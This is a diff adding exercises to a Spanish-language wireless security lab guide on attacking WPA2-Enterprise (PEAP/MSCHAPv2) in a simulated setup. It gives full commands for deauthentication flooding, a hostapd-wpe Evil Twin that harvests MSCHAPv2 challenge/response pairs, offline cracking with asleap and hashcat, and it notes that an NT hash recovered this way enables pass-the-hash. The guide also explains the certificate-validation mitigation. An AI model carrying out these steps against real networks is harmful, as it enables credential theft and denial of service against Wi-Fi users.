@@ -705,13 +705,125 @@ sudo ip netns exec ns_cli_ent wpa_cli -p /var/run/wpa_supplicant_ent -i wlan_cli
 # wpa_state=COMPLETED  /  EAP state=SUCCESS  /  selectedMethod=25 (EAP-PEAP)
 ```
 
+### d) Método 1 — suite aircrack-ng (y por qué **no** crackea Enterprise)
+
+Es un ejercicio de contraste, no un ataque que funcione. El alumno comprueba
+de primera mano que la vía habitual contra WPA2-PSK aquí no sirve.
+
+```bash
+# Capturar el handshake igual que en he_wpa2
+sudo airmon-ng start wlan0 3
+sudo airodump-ng -c 3 --bssid <BSSID_ENT> -w cap_ent wlan0mon
+
+# Forzar una reautenticación (opcional: el cliente ya reasocia cada 30 s)
+sudo aireplay-ng -0 3 -a <BSSID_ENT> -c <MAC_CLIENTE> wlan0mon
+
+# Intentar crackear el handshake con diccionario
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID_ENT> cap_ent-01.cap
+```
+
+**Resultado:** aircrack-ng dice `got no data packets` o prueba claves y
+**nunca acierta**, por mucho diccionario que se le dé. Motivo: en WPA-Enterprise
+la PMK **no** sale de `PBKDF2(passphrase, SSID)`, sino de la sesión TLS (MSK),
+distinta en cada conexión. No hay una contraseña de red común que adivinar, así
+que el ataque de diccionario al 4-way es inaplicable. La suite aircrack-ng solo
+sirve aquí para la parte pasiva (identidad y tipo EAP del apartado b) y para el
+deauth que alimenta al método 2.
+
+### e) Método 2 — Evil Twin con `hostapd-wpe` (RADIUS falso)
+
+Es el ataque realista contra PEAP/MSCHAPv2. Se monta un AP gemelo con un RADIUS
+falso que **registra el reto y la respuesta MSCHAPv2** del cliente. Como el
+cliente del lab no valida el certificado del servidor, entrega sus credenciales
+al gemelo. Después se crackean offline.
+
+`hostapd-wpe` ya se instala con el laboratorio.
+
+**1. Configurar el AP gemelo** (mismo SSID que el objetivo, en otra interfaz):
+
+```bash
+sudo cp /etc/hostapd-wpe/hostapd-wpe.conf /tmp/et.conf
+sudo sed -i 's/^interface=.*/interface=wlan1/' /tmp/et.conf
+sudo sed -i 's/^ssid=.*/ssid=he_enterprise/'   /tmp/et.conf
+sudo sed -i 's/^channel=.*/channel=3/'         /tmp/et.conf
+```
+
+**2. Arrancar el gemelo** (deja wlan1 como AP; no hace falta monitor):
+
+```bash
+sudo hostapd-wpe /tmp/et.conf
+# Queda a la escucha. Cada cliente que se autentique deja sus credenciales aquí.
+```
+
+**3. Empujar al cliente hacia el gemelo** desde otra terminal. Con deauth
+repetido, el cliente pierde el AP real y, al reasociar, puede elegir el gemelo:
+
+```bash
+sudo airmon-ng start wlan0 3
+sudo aireplay-ng -0 0 -a <BSSID_ENT> -c <MAC_CLIENTE> wlan0mon   # Ctrl+C al capturar
+```
+
+**4. Leer el reto/respuesta.** Cuando el cliente se autentica contra el gemelo,
+`hostapd-wpe` imprime (y guarda en `/etc/hostapd-wpe/hostapd-wpe.log`) algo así:
+
+```
+username:    student_user@domain.lab
+challenge:   <16 hex>
+response:    <48 hex>
+jtr NETNTLM: student_user@domain.lab:$NETNTLM$<challenge>$<response>
+hashcat:     <challenge>:<response>
+```
+
+**5. Crackear offline** el MSCHAPv2 capturado, por cualquiera de las dos vías:
+
+```bash
+# asleap con diccionario
+asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt
+
+# o hashcat modo 5500 (NetNTLMv1 / MSCHAPv2)
+echo '<challenge>:<response>' > ent.hash
+hashcat -m 5500 ent.hash /usr/share/wordlists/rockyou.txt
+```
+
+**Resultado esperado:** la contraseña de `he_enterprise` es
+`EnterprisePass2026`, **elegida a propósito fuera de `rockyou.txt`**. Con el
+diccionario de serie el crackeo **falla**: el objetivo del lab es *capturar* el
+reto/respuesta, no recuperar la clave. Para ver también el crackeo, añade la
+palabra a un diccionario propio:
+
+```bash
+echo 'EnterprisePass2026' > /tmp/dic_ent.txt
+asleap -C <challenge> -R <response> -W /tmp/dic_ent.txt
+```
+
+**Recuperar el hash NT aunque la clave no esté en diccionario.** La respuesta
+MSCHAPv2 se puede reducir a un solo DES (2^56) y obtener el hash NT con
+`chapcrack`, sea cual sea la contraseña. Ese hash sirve para *pass-the-hash*
+contra otros servicios NTLM, sin conocer la contraseña en claro.
+
+**Notas de laboratorio:**
+
+- En `mac80211_hwsim` todas las radios se oyen con la misma señal, así que el
+  cliente puede seguir prefiriendo el AP real. Para forzar la demostración,
+  mantén el deauth (`aireplay-ng -0 0`) o, en un lab aislado, para brevemente el
+  AP legítimo: `sudo ip netns exec ns_ap_ent pkill hostapd`. Vuelve a desplegar
+  al terminar.
+- Si solo quieres comprobar que el gemelo captura, conéctate tú mismo con un
+  cliente de prueba configurado para `he_enterprise` sin validar certificado.
+- El cliente del lab **no** valida el certificado (sin `ca_cert`): por eso el
+  ataque funciona. Con `ca_cert` fijado y `domain_suffix_match`, el gemelo
+  presentaría un certificado que no es de confianza y el cliente **abortaría**
+  antes de enviar nada: es justo la mitigación.
+
 ### Fundamento técnico
 
 - **No hay una clave compartida que crackear.** En 802.1X cada usuario se
   autentica con sus credenciales contra un servidor de autenticación
   (normalmente RADIUS; en el lab, el EAP integrado de hostapd). La PMK se deriva
   de la sesión TLS (MSK) y es distinta para cada usuario y conexión. Capturar
-  el handshake 4-way no sirve: la PMK no sale de ninguna contraseña común.
+  el handshake 4-way no sirve: la PMK no sale de ninguna contraseña común. Por
+  eso el **método 1 (aircrack-ng) no puede crackear la red** y hay que recurrir
+  al **método 2 (Evil Twin)**, que ataca a MSCHAPv2 dentro del túnel.
 - **Fuga 1: la identidad externa.** El `EAP-Response/Identity` se envía
   **antes** de montar el túnel TLS, así que el usuario viaja en claro. Es lo
   que se obtiene en este lab. Mitigación: identidad externa anónima
